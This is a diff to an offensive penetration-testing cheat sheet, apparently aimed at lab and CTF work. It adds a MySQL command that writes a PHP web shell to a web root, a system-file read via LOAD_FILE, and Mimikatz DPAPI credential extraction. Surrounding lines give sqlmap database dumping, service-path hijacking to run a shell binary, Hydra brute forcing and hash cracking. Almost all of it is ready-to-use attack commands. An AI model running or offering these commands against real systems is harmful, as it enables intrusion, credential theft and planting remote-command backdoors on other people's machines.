@@ -68,9 +68,6 @@ Try null sessions and guest accounts first.
   rpcclient -U "" -N 10.10.10.10 -c "enumdomusers"
   ```
   smbmap -H 10.10.10.10
-
-  proxychains smbmap -H 10.10.10.10 -u user -p password -d domain
- 
   netexec smb 10.10.10.10 -u user -p password --shares
 ```
 - **NTLM Hash Theft (Writable Share)**:
@@ -295,6 +292,10 @@ Use these when you have a shell but no tools (like BloodHound/Netexec) uploaded 
   sqlmap -u "http://10.10.10.10/page.php?id=1" --dbms mysql --batch --dump
   sqlmap -r request.txt --level 5 --risk 3
   ```
+- **Login & Shell (MySQL/MariaDB):**
+  - **Check File Privs**: `SELECT user, host, file_priv FROM mysql.user;`
+  - **Write Web Shell**: `SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/path/to/www/shell.php';`
+  - **Read File**: `SELECT LOAD_FILE('C:/windows/win.ini');`
 - **MSSQL Login & Impersonation**:
   - **Login**: `impacket-mssqlclient 'DOMAIN/user':'password'@10.10.10.10 -windows-auth`
   - **Find Impersonatable**: `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
@@ -413,6 +414,12 @@ Include multiple variations for different OS targets and filtering environments.
   - `Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\[SERVICE] -Name ImagePath -Value "C:\temp\shell.exe"`
   - `Start-Service [SERVICE]`
 
+- **DPAPI Masterkey & Credential Extraction:**
+  - *Identify*: Look for files in `%AppData%\Local\Microsoft\Credentials\` or `%AppData%\Roaming\Microsoft\Protect\`.
+  - *Extraction*:
+    1. Base64 masterkey file.
+    2. Use Mimikatz: `mimikatz.exe "dpapi::cred /in:C:\path\to\creds_file /masterkey:[HEX_KEY]" "exit"`
+
 ---
 
 ## 5. Utilities & Post-Exploitation
@@ -446,11 +453,13 @@ Include multiple variations for different OS targets and filtering environments.
 - **Hydra (Service Brute Force):**
   ```bash
   hydra -L users.txt -P rockyou.txt ssh://10.10.10.10 -t 4
+  
   hydra -L users.txt -e nsr -t 16 ftp://10.10.10.10 # -e nsr: null, same, reverse
   ```
 - **John the Ripper:**
   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+  
   john --format=nt hashes.txt --rules
   ```
 - **Hashcat:**
@@ -613,6 +622,3 @@ Include multiple variations for different OS targets and filtering environments.
 
 ---
 **Final Word:** Keep your shells stable, your enumeration deep, and don't panic. If one door is locked, check the window! 🚀
-
-
-
